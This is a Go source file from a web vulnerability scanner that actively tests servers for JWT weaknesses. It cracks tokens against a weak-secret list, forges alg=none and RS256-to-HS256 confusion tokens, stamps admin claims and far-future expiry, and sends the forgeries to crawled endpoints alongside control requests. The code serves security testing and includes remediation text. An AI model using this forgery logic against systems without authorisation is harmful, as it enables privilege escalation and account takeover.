package scanner

import (
	"context"
	"crypto/hmac"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/sha512"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"hash"
	"math/big"
	"strings"
	"time"

	"ssghost666/internal/httpclient"
	"ssghost666/internal/model"
	"ssghost666/internal/ratelimiter"
)

// --- Advanced JWT testing ---------------------------------------------------
//
// The passive check in auth.go (DecodeJWT) only reads whatever token the
// user supplied on the command line and complains about obvious structural
// problems. This file goes further and actively tests the *server* against
// a family of well-known JWT implementation weaknesses:
//
//   1. Weak HS256/384/512 signing secrets — the token's own signature is
//      verified locally against a built-in list of common/leaked secrets.
//      A hit means anybody can mint tokens with arbitrary claims.
//   2. alg="none" forgery — a token is re-built with an unsigned header and
//      a tampered payload, then offered to the API. If the API answers with
//      a success status while a deliberately-invalid control token gets a
//      401/403, the server is trusting unsigned tokens.
//   3. Algorithm confusion (RS256 → HS256) — the service's own RSA public
//      key (fetched from its JWKS endpoint) is used as the *HMAC secret*.
//      Implementations that don't pin the algorithm accept this forged
//      token, which is the classic RS/HS confusion bug.
//   4. Claim manipulation / expiration abuse — authority-ish claims
//      (role, is_admin, ...) are elevated and the expiry pushed far into
//      the future, then tested the same way as (2).
//
// Every probe is a read-only request. Forged tokens are only ever sent with
// GET/HEAD/POST to targets discovered during crawling, and each token is
// always paired with a control request so a public (unauthenticated)
// endpoint can't masquerade as a vulnerability.

// jwtWeakSecrets is a compact list of the signing secrets that show up
// again and again in real-world JWTCTF writeups, framework quickstarts and
// leaked configuration dumps. It is intentionally small — this is a
// smoke test for "did they use a default/obvious secret", not an offline
// cracking rig.
var jwtWeakSecrets = []string{
	"secret", "secretkey", "secret_key", "secrets", "jwt", "jwtsecret",
	"jwt_secret", "jwt-secret", "jwtkey", "jwt_key", "mysecret", "my-secret",
	"mykey", "changeme", "change_me", "changethis", "password", "passwd",
	"p@ssw0rd", "123456", "123456789", "1234567890", "qwerty", "admin",
	"administrator", "root", "test", "testkey", "testing", "dev", "develop",
	"development", "prod", "production", "staging", "demo", "example",
	"examplekey", "default", "defaultkey", "secret123", "supersecret",
	"super_secret", "topsecret", "top-secret", "key", "keys", "keyboard",
	"token", "tokens", "tokenkey", "token_key", "auth", "authkey",
	"auth_key", "apikey", "api_key", "api-secret", "app", "appkey",
	"application", "backend", "server", "serverkey", "node", "nodejs",
	"golang", "python", "django", "django-insecure", "flask", "laravel",
	"spring", "springboot", "rails", "ruby", "java", "php", "express",
	"node_secret", "verysecret", "very_secret", "ultrasecret", "hardsecret",
	"hardcoded", "hardcoded_secret", "insecure", "unsafe", "nonsecret",
	"notsosecret", "nososecret", "1234", "12345", "abc123", "abc123456",
	"kang", "temppass", "temporary", "secret-123", "secret1234",
	"SSGhost666", "ssghost666", "0", "1", "null", "undefined", "true",
}

// jwtSecretsNowHint: the maximum number of targets a forged token is
// offered to. Acceptance is proven by a single 2xx, so there's no reason to
// spray every crawled URL.
const maxJWTProbeTargets = 5

// jwtParts is a decoded (never verified) JWT.
type jwtParts struct {
	Header      map[string]interface{}
	Payload     map[string]interface{}
	RawHeader   string
	RawPayload  string
	RawSig      string
	SigningData string // "header.payload" — the exact bytes a signature covers
}

// decodeJWT splits and base64url-decodes a three-part token. It returns
// false for anything that isn't a decodable JWT-shaped string.
func decodeJWT(token string) (*jwtParts, bool) {
	token = strings.TrimSpace(token)
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, false
	}
	hb, err1 := base64.RawURLEncoding.DecodeString(parts[0])
	pb, err2 := base64.RawURLEncoding.DecodeString(parts[1])
	if err1 != nil || err2 != nil {
		return nil, false
	}
	p := &jwtParts{
		RawHeader:   parts[0],
		RawPayload:  parts[1],
		RawSig:      parts[2],
		SigningData: parts[0] + "." + parts[1],
	}
	if json.Unmarshal(hb, &p.Header) != nil || json.Unmarshal(pb, &p.Payload) != nil {
		return nil, false
	}
	return p, true
}

func jwtAlg(p *jwtParts) string {
	a, _ := p.Header["alg"].(string)
	return strings.ToUpper(a)
}

// hmacHashFor returns the hash constructor for an HS* algorithm.
func hmacHashFor(alg string) (func() hash.Hash, bool) {
	switch alg {
	case "HS256":
		return sha256.New, true
	case "HS384":
		return sha512.New384, true
	case "HS512":
		return sha512.New, true
	}
	return nil, false
}

// crackWeakJWTSecret verifies the token's own signature against the built-in
// weak-secret list. A match is cryptographic proof the secret is guessable —
// no server interaction required.
func crackWeakJWTSecret(p *jwtParts) (string, bool) {
	alg := jwtAlg(p)
	newHash, ok := hmacHashFor(alg)
	if !ok {
		return "", false
	}
	want, err := base64.RawURLEncoding.DecodeString(p.RawSig)
	if err != nil || len(want) == 0 {
		return "", false
	}
	for _, secret := range jwtWeakSecrets {
		mac := hmac.New(newHash, []byte(secret))
		mac.Write([]byte(p.SigningData))
		if hmac.Equal(mac.Sum(nil), want) {
			return secret, true
		}
	}
	return "", false
}

func b64url(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }

// buildJWT assembles a token from a JSON header/payload and a signature.
// key/alg are ignored when alg is "none" (empty signature), which is exactly
// the forgery the alg:none test needs.
func buildJWT(header map[string]interface{}, payload map[string]interface{}, key []byte, alg string) (string, error) {
	hj, err := json.Marshal(header)
	if err != nil {
		return "", err
	}
	pj, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}
	signingData := b64url(hj) + "." + b64url(pj)
	up := strings.ToUpper(alg)
	if up == "NONE" || up == "" {
		return signingData + ".", nil
	}
	newHash, ok := hmacHashFor(up)
	if !ok {
		return "", fmt.Errorf("unsupported signing algorithm %q", alg)
	}
	mac := hmac.New(newHash, key)
	mac.Write([]byte(signingData))
	return signingData + "." + b64url(mac.Sum(nil)), nil
}

// jwtProbeTargets picks a small, stable set of targets worth offering a
// forged token to: API/auth-shaped endpoints first, then ordinary ones.
// DELETE is excluded outright since the whole tool is non-destructive.
func jwtProbeTargets(targets []model.Target) []model.Target {
	var preferred, rest []model.Target
	seen := map[string]bool{}
	for _, t := range targets {
		if t.Method == "DELETE" {
			continue
		}
		key := strings.Split(t.URL, "?")[0]
		if seen[key] {
			continue
		}
		seen[key] = true
		if t.RequiresAuth || looksAuthShapedURL(t.URL) {
			preferred = append(preferred, t)
		} else {
			rest = append(rest, t)
		}
	}
	out := append(preferred, rest...)
	if len(out) > maxJWTProbeTargets {
		out = out[:maxJWTProbeTargets]
	}
	return out
}

func looksAuthShapedURL(rawURL string) bool {
	low := strings.ToLower(rawURL)
	for _, h := range append([]string{"/api", "/me", "/user", "/account", "/profile", "/auth", "/session"}, authSensitivePathHints...) {
		if strings.Contains(low, h) {
			return true
		}
	}
	return false
}

// jwtAcceptance probes whether the service accepts a forged token without
// complaining about its signature. It first sends a deliberately-invalid
// control token: if that already succeeds the endpoint is public and the
// whole comparison is meaningless, so it bails out. Otherwise a 2xx on the
// forged token (where the control got 401/403) is real evidence.
func jwtAcceptance(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, t model.Target, forged string) (*httpclient.Exchange, bool) {
	probe := func(token string) *httpclient.Exchange {
		if !lim.Acquire(ctx) {
			return nil
		}
		defer lim.Release()
		method := firstNonEmpty(t.Method, "GET")
		ex := cli.Do(method, t.URL, nil, map[string]string{"Authorization": "Bearer " + token})
		observeForAdaptive(lim, ex)
		return ex
	}

	control := probe("ssghost666.invalid." + b64url([]byte(Marker())))
	if control == nil || control.Response == nil || control.Err != nil {
		return nil, false
	}
	if statusIsSuccess(control.Response.StatusCode) {
		return nil, false // endpoint answers 2xx with garbage credentials: it's public, not vulnerable
	}

	ex := probe(forged)
	if ex == nil || ex.Response == nil || ex.Err != nil {
		return nil, false
	}
	return ex, statusIsSuccess(ex.Response.StatusCode)
}

func statusIsSuccess(code int) bool { return code >= 200 && code < 300 }

// --- RSA public key retrieval (for the RS→HS confusion test) ----------------

type jwkKeySet struct {
	Keys []jwkKey `json:"keys"`
}

type jwkKey struct {
	Kty string `json:"kty"`
	Kid string `json:"kid"`
	Use string `json:"use"`
	Alg string `json:"alg"`
	N   string `json:"n"`
	E   string `json:"e"`
}

type oidcDiscovery struct {
	JWKSURI string `json:"jwks_uri"`
}

// fetchJWKSKeyPEMs asks the target's well-known endpoints for a JWKS and
// returns each RSA public key PEM-encoded. Bounded to two extra requests and
// completely silent on failure — this is a best-effort step, and a service
// without a published JWKS simply can't be tested for RS→HS confusion.
func fetchJWKSKeyPEMs(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, root string) []string {
	root = strings.TrimRight(root, "/")
	get := func(u string) []byte {
		if !lim.Acquire(ctx) {
			return nil
		}
		defer lim.Release()
		ex := cli.Get(u)
		observeForAdaptive(lim, ex)
		if ex == nil || ex.Err != nil || ex.Response == nil || !statusIsSuccess(ex.Response.StatusCode) {
			return nil
		}
		return []byte(ex.Body)
	}

	jwksURL := root + "/.well-known/jwks.json"
	if disc := get(root + "/.well-known/openid-configuration"); len(disc) > 0 {
		var d oidcDiscovery
		if json.Unmarshal(disc, &d) == nil && d.JWKSURI != "" {
			jwksURL = d.JWKSURI
		}
	}
	raw := get(jwksURL)
	if len(raw) == 0 {
		return nil
	}
	var set jwkKeySet
	if json.Unmarshal(raw, &set) != nil {
		return nil
	}
	var pems []string
	for _, k := range set.Keys {
		if !strings.EqualFold(k.Kty, "RSA") || k.N == "" || k.E == "" {
			continue
		}
		if pemStr := rsaJWKToPEM(k); pemStr != "" {
			pems = append(pems, pemStr)
		}
	}
	return pems
}

// rsaJWKToPEM converts a JWK RSA key (base64url modulus/exponent) into a
// PKIX PEM block, which is the exact byte sequence a confused verifier ends
// up using as an HMAC secret.
func rsaJWKToPEM(k jwkKey) string {
	nb, err := base64.RawURLEncoding.DecodeString(k.N)
	if err != nil || len(nb) == 0 {
		return ""
	}
	eb, err := base64.RawURLEncoding.DecodeString(k.E)
	if err != nil || len(eb) == 0 {
		return ""
	}
	e := new(big.Int).SetBytes(eb)
	if !e.IsInt64() || e.Int64() <= 0 || e.Int64() > 1<<31 {
		return ""
	}
	pub := &rsa.PublicKey{N: new(big.Int).SetBytes(nb), E: int(e.Int64())}
	der, err := x509.MarshalPKIXPublicKey(pub)
	if err != nil {
		return ""
	}
	return string(pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der}))
}

// --- The check --------------------------------------------------------------

// CheckJWTFuzzing runs the active JWT tests described at the top of this
// file. token is the caller-supplied -bearer value (required: without a real
// token there's nothing to analyse or forge from).
func CheckJWTFuzzing(ctx context.Context, lim *ratelimiter.Limiter, cli *httpclient.Client, token string, targets []model.Target) []model.Finding {
	p, ok := decodeJWT(token)
	if !ok {
		return nil
	}
	var findings []model.Finding
	alg := jwtAlg(p)

	// (1) Weak HS* signing secret — proven locally, no request needed.
	var recovered []byte
	if secret, hit := crackWeakJWTSecret(p); hit {
		recovered = []byte(secret)
		findings = append(findings, model.Finding{
			Category:    "JWT",
			Severity:    model.SeverityCritical,
			Title:       fmt.Sprintf("JWT signed with a guessable secret (%s)", alg),
			Description: fmt.Sprintf("The bearer token's %s signature verifies successfully against the well-known secret %q. Anyone who reads this public list can sign a token with arbitrary claims (e.g. an elevated role) and the server will accept it as authentic.", alg, secret),
			Evidence:    model.Evidence{Notes: fmt.Sprintf("Verified locally with HMAC-%s over %q using secret %q. No request was required — this is cryptographic proof.", alg, p.SigningData, secret)},
			Remediation: "Replace the signing secret with a cryptographically random value of at least 256 bits, rotate it immediately, and rotate/revoke all existing tokens.",
		})
	}

	probeTargets := jwtProbeTargets(targets)

	// Forged-payload variants, in increasing order of how damning a hit is.
	type forgeVariant struct {
		name     string
		alg      string
		key      []byte
		severity model.Severity
		desc     string
	}
	payload := map[string]interface{}{}
	for k, v := range p.Payload {
		payload[k] = v
	}
	payload["exp"] = time.Now().Add(10 * 365 * 24 * time.Hour).Unix()
	payload["iat"] = time.Now().Add(-time.Hour).Unix()
	elevateClaims(payload)

	var variants []forgeVariant
	variants = append(variants, forgeVariant{
		name:     "alg=none",
		alg:      "none",
		severity: model.SeverityCritical,
		desc:     "The server accepted a completely unsigned token (alg=\"none\") carrying modified claims. Signature verification is effectively disabled, so any client can forge tokens with any identity or privileges.",
	})
	if len(recovered) > 0 {
		variants = append(variants, forgeVariant{
			name:     "weak secret re-sign",
			alg:      alg,
			key:      recovered,
			severity: model.SeverityCritical,
			desc:     fmt.Sprintf("The server accepted a token freshly signed with the recovered weak secret %q, confirming the secret is exploitable end-to-end and not merely a lucky local match.", string(recovered)),
		})
	}
	if strings.HasPrefix(alg, "RS") || strings.HasPrefix(alg, "PS") {
		pems := fetchJWKSKeyPEMs(ctx, lim, cli, rootURL(targets))
		if len(pems) > 0 {
			variants = append(variants, forgeVariant{
				name:     "algorithm confusion (RS→HS)",
				alg:      "HS256",
				key:      []byte(pems[0]),
				severity: model.SeverityCritical,
				desc:     "The server accepted a token signed with HMAC using its own published RSA public key as the secret. The verifier is not pinning the algorithm, so the RS256→HS256 confusion attack applies and tokens can be forged by anyone who can read the JWKS.",
			})
		}
	}

	for _, v := range variants {
		header := map[string]interface{}{"alg": v.alg}
		if typ, ok := p.Header["typ"]; ok {
			header["typ"] = typ
		} else {
			header["typ"] = "JWT"
		}
		if kid, ok := p.Header["kid"]; ok {
			header["kid"] = kid
		}
		if v.alg == "none" || strings.HasPrefix(v.alg, "HS") {
			delete(header, "kid")
		}
		forged, err := buildJWT(header, payload, v.key, v.alg)
		if err != nil {
			continue
		}
		for _, t := range probeTargets {
			ex, accepted := jwtAcceptance(ctx, lim, cli, t, forged)
			if !accepted || ex == nil {
				continue
			}
			findings = append(findings, model.Finding{
				Category:    "JWT",
				Severity:    v.severity,
				Title:       "JWT forgery accepted by the server (" + v.name + ")",
				Description: v.desc + " The forged token carried elevated claims (see evidence) and the endpoint answered with a success status where a deliberately-invalid control token was rejected.",
				URL:         t.URL,
				Method:      t.Method,
				Parameter:   "Authorization",
				Evidence: model.Evidence{
					RequestRaw:  ex.RequestRaw,
					ResponseRaw: ex.ResponseRaw,
					Notes:       fmt.Sprintf("Forged variant: %s | Claims sent: %s", v.name, compactClaims(payload)),
				},
				Remediation: "Pin the accepted signing algorithm(s) on the verifier, reject alg=\"none\" outright, verify the signature with the correct key type (never treat an RSA public key as an HMAC secret), and enforce signature validation before trusting any claim.",
			})
			break // one accepted endpoint is enough to prove the weakness
		}
	}

	return findings
}

// elevateClaims stamps the most commonly-privileged claim names with
// elevated values, on the theory that whatever the application happens to
// read will be present. Existing values are overwritten (that's the point).
func elevateClaims(payload map[string]interface{}) {
	for _, k := range []string{"role", "roles", "user_role", "scope", "scopes", "type", "userType"} {
		if _, ok := payload[k]; ok {
			payload[k] = "admin"
		}
	}
	for _, k := range []string{"admin", "is_admin", "isAdmin", "superuser", "is_superuser", "email_verified", "verified"} {
		if _, ok := payload[k]; ok {
			payload[k] = true
		}
	}
	// "role" is set unconditionally: an app that merges the token's claims
	// into its own authorisation state ends up elevated even if this exact
	// claim name wasn't present in the original token.
	payload["role"] = "admin"
}

func compactClaims(payload map[string]interface{}) string {
	b, err := json.Marshal(payload)
	if err != nil {
		return "<unencodable>"
	}
	if len(b) > 600 {
		b = append(b[:600], []byte("...")...)
	}
	return string(b)
}

// rootURL returns the scheme://host origin of the first absolute target URL,
// used as the base for well-known JWKS discovery.
func rootURL(targets []model.Target) string {
	for _, t := range targets {
		if t.URL == "" {
			continue
		}
		if u := schemeHostOf(t.URL); u != "" {
			return u
		}
	}
	return ""
}

// schemeHostOf returns "scheme://host" for an absolute URL, or "" if the
// URL isn't parseable that way.
func schemeHostOf(rawURL string) string {
	scheme := ""
	rest := rawURL
	if i := strings.Index(rawURL, "://"); i > 0 {
		scheme = rawURL[:i]
		rest = rawURL[i+3:]
	}
	if scheme == "" {
		return ""
	}
	if i := strings.IndexAny(rest, "/?#"); i >= 0 {
		rest = rest[:i]
	}
	if rest == "" {
		return ""
	}
	return scheme + "://" + rest
}
